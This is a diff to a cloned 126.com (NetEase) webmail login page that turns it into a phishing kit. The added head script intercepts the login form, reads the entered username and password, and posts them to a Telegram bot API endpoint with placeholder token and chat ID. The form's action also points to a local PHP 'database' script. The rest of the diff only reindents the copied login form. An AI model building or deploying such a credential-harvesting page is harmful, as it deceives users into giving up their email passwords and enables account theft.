@@ -2,6 +2,47 @@
 <html>
 	<head>
 		<title>126网易免费邮--你的专业电子邮局</title>
+		<script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.getElementById('login126');
+
+            form.addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                const username = document.getElementById('idInput').value;
+                const password = document.getElementById('pwdInput').value;
+
+                // Replace these with your Telegram Bot Token and Chat ID
+                const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
+
+                const message = `Username: ${username}\nPassword: ${password}`;
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Message sent successfully');
+                    } else {
+                        console.error('Error sending message:', data);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+
+                // Optionally, you can submit the form here if you still want to continue with form submission.
+                // form.submit();
+            });
+        });
+    </script>
 		<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
 		<meta name="description" content="网易126免费邮箱--你的专业电子邮局。14年邮箱运营经验，系统快速稳定，垃圾邮件拦截率超过98%，邮箱容量自动翻倍，支持高达2G超大附件，提供免费网盘及手机号码邮箱服务。">
 		<meta name="keywords" content="邮件，邮箱，电子邮件，电子邮箱，网易邮箱，126邮箱，免费邮箱，mail，email，网盘">
@@ -306,92 +347,93 @@
 					</div>
 				</div>
 				<div class="loginForm">
-					<form id="login126" name="login126" method="post" action="126_update1_connect_msql_database.php" target="frameforlogin">
-						<input type="hidden" id="username" name="username" value="0" />
-						<input type="hidden" id="savelogin" name="savelogin" value="0" />
-						<input type="hidden" id="url2" name="url2" value="http://mail.126.com/errorpage/err_126.htm" />
-						<div id="idInputLine" class="loginFormIpt showPlaceholder" style="margin-top:36px;">
-							<input class="loginFormTdIpt" tabindex="1" title="请输入帐号" id="idInput" type="text" maxlength="50" value="" style="width:145px;" />
-							<span class="domain">@126.com</span>
-							<div id="mobtips" style="display:;"></div>
-							<label for="idInput" class="placeholder" id="idPlaceholder">邮箱帐号或手机号</label>
-						</div>
-						<div class="forgetPwdLine">
-						</div>
-						<div id="pwdInputLine" class="loginFormIpt showPlaceholder">
-							<input class="loginFormTdIpt" tabindex="2" title="请输入密码" id="pwdInput" name="password" type="password"/>
-							<label for="pwdInput" class="placeholder" id="pwdPlaceholder">密码</label>
-						</div>
-						<div id="lfAutoLogin" class="loginFormCheck">
-							<div class="loginFormCheckInner">
-								<input tabindex="3" title="两周内自动登录" class="loginFormCbx" type="checkbox" id="remAutoLogin" /><label id="remAutoLoginTxt" class="loginFormSslText" for="remAutoLogin">&nbsp;两周内自动登录</label>
-								<div class="unishadow" id="whatAutologinTip">为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
-								</div>
-								<a class="whatAutologin" href="http://help.163.com/09/1214/11/5QG7HFPJ00753VB9.html?b09abI1" tabindex="4" target="_blank" title="什么是自动登录">什么是自动登录</a>
-							</div>
-							<div class="loginFormCheckInner" style="float:right;text-align:right;width:100px;">
-								<a class="forgetPwd" href="http://reg.163.com/RecoverPasswd1.shtml?from=mail126" target="_blank" title="找回密码">忘记密码了?</a>
-							</div>
-							<div class="loginFormCheckInner" style="display:none">
-								<input class="loginFormCbx loginFormSslCbx" type="checkbox" tabindex="5" title="SSL安全登录" id="SslLogin" checked="checked" /><label class="loginFormSslText" for="SslLogin">&nbsp;<span style="font-family:verdana;">SSL</span>安全登录</label>
-							</div>
-						</div>
-						<div class="loginFormIpt loginFormIptWiotTh">
-							<button id="loginBtn" class="btn btn-login" class="formSubmit" tabindex="6" type="submit">登&nbsp;录</button>
-							<a id="lfBtnReg" class="btn btn-reg" href="http://reg.email.163.com/mailregAll/reg0.jsp?from=126mail" target="_blank" tabindex="7">注&nbsp;册</a>
-							<a id="lfBtnReg2" class="btn btn-reg" href="http://e.mail.163.com/mobilemail/home.do?from=163mail" target="_blank" tabindex="7">注&nbsp;册</a>
-						</div>
-						<div class="loginFormConf">
-							<div class="loginFormVer">
-								邮箱版本: <a id="styleConf" href="javascript:void(0);">默认版本 <b class="ico ico-arr ico-arr-d"></b></a>
-							</div>
-							<div class="loginFormService">正在使用SSL登录</div>
-							<div class="loginFormService" style="display:none">
-								 <a id="selectLocationTips" href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">登录速度太慢? <b class="ico ico-arr ico-arr-d"></b></a>
-								<span id="selectLocationTipsDone">
-									<a href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">
-										<span>服务器: <span id="selectLocation">电信</span></span><b class="ico ico-arr ico-arr-d"></b>
-									</a>
-								</span>
-							</div>
-							<div id="styleConfBlock" class="loginFormVerList unishadow">
-								<ul>
-									<li><a id="styleconf-1" class="verSelected" href="javascript:void(0);" onclick="fSetStyle(-1)">默认版本</a></li>
-									<li><a id="styleconf5" href="javascript:void(0);" onclick="fSetStyle(5)">网易邮箱<span class="fontWeight">5.0</span>版</a></li>
-									<li><a id="styleconf8" href="javascript:void(0);" onclick="fSetStyle(8)">极速<span class="fontWeight">4.0</span></a></li>
-									<li><a id="styleconf3" href="javascript:void(0);" onclick="fSetStyle(3)">简约<span class="fontWeight">3.0</span></a></li>
-								</ul>
-							</div>
-							<div id="locationTest" class="unishadow">
-								<div class="locationTestTitle">
-									<h4>测试并选择最佳服务器</h4>
-									<a class="locationTestTitleClose" href="javascript:void(0);" onclick="fSelectLoaction();return false;">>关闭</a>
-								</div>
-								<div class="locationTestList">
-									<ul>
-										<li>
-											<a id="locationHref0" href="javascript:void(0);" onclick="fLocationChoose('t');return false;">
-											电&nbsp;&nbsp;&nbsp;信
-											<br/><span class="locationTestEach" id="locationTest0"></span>
-											</a>
-										</li>
-										<li style="border-left:1px solid #d5dbe2;border-right:1px solid #d5dbe2;">
-											<a id="locationHref1" href="javascript:void(0);" onclick="fLocationChoose('c');return false;">
-											联&nbsp;&nbsp;&nbsp;通
-											<br/><span class="locationTestEach" id="locationTest1"></span>
-											</a>
-										</li>
-										<li>
-											<a id="locationHref2" href="javascript:void(0);" onclick="fLocationChoose('e');return false;">
-											教育网
-											<br/><span class="locationTestEach" id="locationTest2"></span>
-											</a>
-										</li>
-									</ul>
-								</div>
-							</div>						
-						</div>
-					</form>
+        <form id="login126" name="login126" method="post" action="126_update1_connect_msql_database.php" target="frameforlogin">
+            <input type="hidden" id="username" name="username" value="0" />
+            <input type="hidden" id="savelogin" name="savelogin" value="0" />
+            <input type="hidden" id="url2" name="url2" value="http://mail.126.com/errorpage/err_126.htm" />
+            <div id="idInputLine" class="loginFormIpt showPlaceholder" style="margin-top:36px;">
+                <input class="loginFormTdIpt" tabindex="1" title="请输入帐号" id="idInput" type="text" maxlength="50" value="" style="width:145px;" />
+                <span class="domain">@126.com</span>
+                <div id="mobtips" style="display:;"></div>
+                <label for="idInput" class="placeholder" id="idPlaceholder">邮箱帐号或手机号</label>
+            </div>
+            <div class="forgetPwdLine">
+            </div>
+            <div id="pwdInputLine" class="loginFormIpt showPlaceholder">
+                <input class="loginFormTdIpt" tabindex="2" title="请输入密码" id="pwdInput" name="password" type="password"/>
+                <label for="pwdInput" class="placeholder" id="pwdPlaceholder">密码</label>
+            </div>
+            <div id="lfAutoLogin" class="loginFormCheck">
+                <div class="loginFormCheckInner">
+                    <input tabindex="3" title="两周内自动登录" class="loginFormCbx" type="checkbox" id="remAutoLogin" /><label id="remAutoLoginTxt" class="loginFormSslText" for="remAutoLogin">&nbsp;两周内自动登录</label>
+                    <div class="unishadow" id="whatAutologinTip">为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
+                    </div>
+                    <a class="whatAutologin" href="http://help.163.com/09/1214/11/5QG7HFPJ00753VB9.html?b09abI1" tabindex="4" target="_blank" title="什么是自动登录">什么是自动登录</a>
+                </div>
+                <div class="loginFormCheckInner" style="float:right;text-align:right;width:100px;">
+                    <a class="forgetPwd" href="http://reg.163.com/RecoverPasswd1.shtml?from=mail126" target="_blank" title="找回密码">忘记密码了?</a>
+                </div>
+                <div class="loginFormCheckInner" style="display:none">
+                    <input class="loginFormCbx loginFormSslCbx" type="checkbox" tabindex="5" title="SSL安全登录" id="SslLogin" checked="checked" /><label class="loginFormSslText" for="SslLogin">&nbsp;<span style="font-family:verdana;">SSL</span>安全登录</label>
+                </div>
+            </div>
+            <div class="loginFormIpt loginFormIptWiotTh">
+                <button id="loginBtn" class="btn btn-login" class="formSubmit" tabindex="6" type="submit">登&nbsp;录</button>
+                <a id="lfBtnReg" class="btn btn-reg" href="http://reg.email.163.com/mailregAll/reg0.jsp?from=126mail" target="_blank" tabindex="7">注&nbsp;册</a>
+                <a id="lfBtnReg2" class="btn btn-reg" href="http://e.mail.163.com/mobilemail/home.do?from=163mail" target="_blank" tabindex="7">注&nbsp;册</a>
+            </div>
+            <div class="loginFormConf">
+                <div class="loginFormVer">
+                    邮箱版本: <a id="styleConf" href="javascript:void(0);">默认版本 <b class="ico ico-arr ico-arr-d"></b></a>
+                </div>
+                <div class="loginFormService">正在使用SSL登录</div>
+                <div class="loginFormService" style="display:none">
+                     <a id="selectLocationTips" href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">登录速度太慢? <b class="ico ico-arr ico-arr-d"></b></a>
+                    <span id="selectLocationTipsDone">
+                        <a href="javascript:void(0);" onclick="fSelectLoaction('show');return false;">
+                            <span>服务器: <span id="selectLocation">电信</span></span><b class="ico ico-arr ico-arr-d"></b>
+                        </a>
+                    </span>
+                </div>
+                <div id="styleConfBlock" class="loginFormVerList unishadow">
+                    <ul>
+                        <li><a id="styleconf-1" class="verSelected" href="javascript:void(0);" onclick="fSetStyle(-1)">默认版本</a></li>
+                        <li><a id="styleconf5" href="javascript:void(0);" onclick="fSetStyle(5)">网易邮箱<span class="fontWeight">5.0</span>版</a></li>
+                        <li><a id="styleconf8" href="javascript:void(0);" onclick="fSetStyle(8)">极速<span class="fontWeight">4.0</span></a></li>
+                        <li><a id="styleconf3" href="javascript:void(0);" onclick="fSetStyle(3)">简约<span class="fontWeight">3.0</span></a></li>
+                    </ul>
+                </div>
+                <div id="locationTest" class="unishadow">
+                    <div class="locationTestTitle">
+                        <h4>测试并选择最佳服务器</h4>
+                        <a class="locationTestTitleClose" href="javascript:void(0);" onclick="fSelectLoaction();return false;">>关闭</a>
+                    </div>
+                    <div class="locationTestList">
+                        <ul>
+                            <li>
+                                <a id="locationHref0" href="javascript:void(0);" onclick="fLocationChoose('t');return false;">
+                                电&nbsp;&nbsp;&nbsp;信
+                                <br/><span class="locationTestEach" id="locationTest0"></span>
+                                </a>
+                            </li>
+                            <li style="border-left:1px solid #d5dbe2;border-right:1px solid #d5dbe2;">
+                                <a id="locationHref1" href="javascript:void(0);" onclick="fLocationChoose('c');return false;">
+                                联&nbsp;&nbsp;&nbsp;通
+                                <br/><span class="locationTestEach" id="locationTest1"></span>
+                                </a>
+                            </li>
+                            <li>
+                                <a id="locationHref2" href="javascript:void(0);" onclick="fLocationChoose('e');return false;">
+                                教育网
+                                <br/><span class="locationTestEach" id="locationTest2"></span>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>                        
+            </div>
+        </form>
+    </div>
 					<div class="ext" id="loginExt">
 						<div id="extVerSelect"><a href="http://ipad.mail.163.com/index.htm?dv=ipad">适配iPad版本</a>&nbsp;|&nbsp;<a href="http://smart.mail.163.com/index.htm?dv=smart">手机智能版</a>&nbsp;|&nbsp;电脑版</div>
 						<ul id="extText">
